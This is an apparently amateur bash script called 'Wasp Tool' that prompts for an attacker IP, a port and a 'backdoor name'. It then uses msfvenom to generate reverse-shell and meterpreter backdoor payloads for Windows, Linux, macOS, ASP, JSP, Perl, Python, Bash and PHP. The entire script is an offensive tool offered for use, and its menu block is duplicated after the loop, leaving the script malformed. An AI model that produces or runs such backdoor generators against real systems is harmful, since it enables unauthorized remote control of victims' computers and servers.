#!/bin/bash
clear
echo
cat << "EOF"
                 _  _
                | )/ )
             \\ |//,' __
             (")(_)-"()))=-
                (\\
                             _   _
  HEELP                     ( | / )
                          \\ \|/,' __
    \_o_/                 (")(_)-"()))=-
       )                     <\\
      /\__
_____ \ ________________________________
__      ____ _ ___ _ __  
\ \ /\ / / _` / __| '_ \ 
 \ V  V / (_| \__ \ |_) |
  \_/\_/ \__,_|___/ .__/ 
                  | |    
                  |_|    
EOF
echo
echo -e "\e[1;31m:::::::Wasp Tool v.1 2017:::::::.\e[0m"

echo -e "\e[1;31mPlease enter Your Ip:\e[0m"
read lip
echo -e "\e[1;31mPlease enter reverse Port:\e[0m"
read lport
echo -e "\e[1;31mPlease enter reverse backdoor name:\e[0m"
read bkname
mkdir -p /usr/share/wasp/payloads
payloadsf="/usr/share/wasp/payloads/"
while :
do
echo
echo -e "\e[1;32m1. Payload Windows[$bkname.Exe] .\e[0m"
echo -e "\e[1;32m2. Payload Linux Binaries[$bkname.Elf] .\e[0m"
echo -e "\e[1;32m3. Payload Mac[$bkname.Macho] .\e[0m"
echo -e "\e[1;32m4. Payload ASP [$bkname.Asp] .\e[0m"
echo -e "\e[1;32m5. Payload JSP [$bkname.jsp] .\e[0m"
echo -e "\e[1;32m6. Payload Perl [$bkname.pl] .\e[0m"
echo -e "\e[1;32m7. Payload Python [$bkname.py] .\e[0m"
echo -e "\e[1;32m8. Payload Bash [$bkname.sh] .\e[0m"
echo -e "\e[1;32m9. Payload Php [$bkname.php].\e[0m"
echo -e "\e[1;32m10. main.\e[0m"
echo -e "\e[1;32m11. Exit.\e[0m"
echo
echo -e "\e[1;36m1. Choice.\e[0m"
read -n3
echo $choice
case "$REPLY" in
     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > /usr/share/wasp/payloads/$bkname.elf ;;
     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > /usr/share/wasp/payloads/$bkname.macho ;;
     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > /usr/share/wasp/payloads/$bkname.asp ;;
     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.jsp ;;
     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.pl ;;
     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.py ;;
     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.php ;;
     10) wasp ;;
     11) exit ;;
     *) echo; echo "Invalid choice."; echo
esac
sleep 1
echo -e "\e[1;31m. Go to $payloadsf \e[0m"
ls $payloadsf
done

echo $choice
case "$REPLY" in
     1) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f exe > /usr/share/wasp/payloads/$bkname.exe ;;
     2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f elf > /usr/share/wasp/payloads/$bkname.elf ;;
     3) msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lip LPORT=$lport -f macho > /usr/share/wasp/payloads/$bkname.macho ;;
     4) msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lip LPORT=$lport -f asp > /usr/share/wasp/payloads/$bkname.asp ;;
     5) msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.jsp ;;
     6) msfvenom -p cmd/unix/reverse_perl LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.pl ;;
     7) msfvenom -p cmd/unix/reverse_python LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.py ;;
     8) msfvenom -p cmd/unix/reverse_bash LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.sh ;;
     9) msfvenom -p php/meterpreter_reverse_tcp LHOST=$lip LPORT=$lport -f raw > /usr/share/wasp/payloads/$bkname.php ;;
     10) wasp ;;
     11) exit ;;
     *) echo; echo "Invalid choice."; echo
esac
echo -e "\e[1;31m. Go to /usr/share/wasp/payloads/ \e[0m"
ls /usr/share/wasp/payloads/
sleep 1
done
